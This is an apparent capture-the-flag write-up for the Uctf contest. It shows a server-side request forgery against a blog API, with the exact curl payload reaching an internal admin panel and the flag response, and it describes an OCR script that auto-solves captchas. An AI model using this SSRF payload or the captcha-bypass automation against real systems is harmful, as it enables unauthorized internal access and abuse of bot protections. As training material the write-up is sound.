<h1>Writeup for Uctf</h1>

I played Uctf with the Cyber_jedi team.I solved three challenges.

- E corp
- Captcha | 1
- Captcha | 2
  
### E-CORP

<img src="https://github.com/SENSEIXENUS2/Ctf-writeupsScripts/blob/main/assets/Images/Uctf.jpg" width="450" height="450">
   
   
   In this web challenge,the website allows access to posts made by users.So,I viewed the source code and discovered a vulnerable code snippet in the api endpoint <u>'/api/view.php'</u> code.The main task in the challenge is to load a website that can't be accessed outside i.e if not connected to their network
The vulnerable code snippet is

  
    <script>
        const API_PATH = '/api/view.php';

        async function fetchPost(id) {
            const fetchResult = await fetch(API_PATH, {
                method: 'POST',
                cache: 'no-cache',
                headers: {
                    'Content-type': 'application/json'
                },
                body: JSON.stringify({ post: `file:///posts/${id}` })
            });

The api receives a request containing json data and uses the file:/// wrapper to load post already saved with a user's id
The api endpoint code loads any url submitted to it without any form of restrictions and it makes it susceptible to Server Side Request Forgery which occurs when a website is induced to load a particular url.I gained access to the websit
e by using the vulnerable endpoint to access it via Curl.  
### Curl request 
  
    curl https://ecorpblog.uctf.ir/api/view.php -v -X POST --header 'Content-Type:application/json' -d '{"post": "http://admin-panel.local/"}'

#### RESPONSE
    * Using Stream ID: 1
    > POST /api/view.php HTTP/2
    > Host: ecorpblog.uctf.ir
    > User-Agent: curl/8.2.1
    > Accept: */*
    > Content-Type:application/json
    > Content-Length: 37
    * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
    * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
    * old SSL session ID is stale, removing
    < HTTP/2 200
    < date: Sun, 03 Sep 2023 13:33:41 GMT
    < content-type: application/json
    < content-length: 50
    < vary: Accept-Encoding
    < x-powered-by: PHP/7.2.34
    < x-xss-protection: 1; mode=block
    < server: ArvanCloud
    < x-sid: 4101
    < server-timing: total;dur=98
    < x-request-id: b72a53f22b5cf18d0b1bb14a5cf75106
    < accept-ranges: bytes
    <
    * Connection #1 to host ecorpblog.uctf.ir left intact
    {"status":"success","post":"uctf{4z174_1n_urm14}"}


###  CAPTCHA | 1


<img src='https://github.com/SENSEIXENUS2/Ctf-writeupsScripts/blob/main/assets/Images/Utcf2.jpg' width= "450" height="450">

In this challenge,the main task was to solve 300 captchas to get the flag.

<img src='https://github.com/SENSEIXENUS2/Ctf-writeupsScripts/blob/main/assets/Images/Uctf3.jpg' width="450" height="450">


I noticed that text in the image can be read with the aid of OCR(optical character recognition).I created a script to autosolve it using python(pytessercat module,requests,base64).
### My Approach

- Submitted a request to the url and submitted the first captcha
- Use split() function to collect the base64 bytes of the image
- Decoded it with the base64 module,stored the data in an already created png file
- Used Pytesseract to extract the text from the png image
- Used a class function to submit the captcha value



<img src = "https://github.com/SENSEIXENUS2/Ctf-writeupsScripts/blob/main/assets/Images/Uctf4.jpg" width="450" height="450">

This is the link to the script <a href="https://github.com/SENSEIXENUS2/Ctf-writeupsScripts/blob/main/UctfWriteups/captcha1.py
">Captcha1's script</a>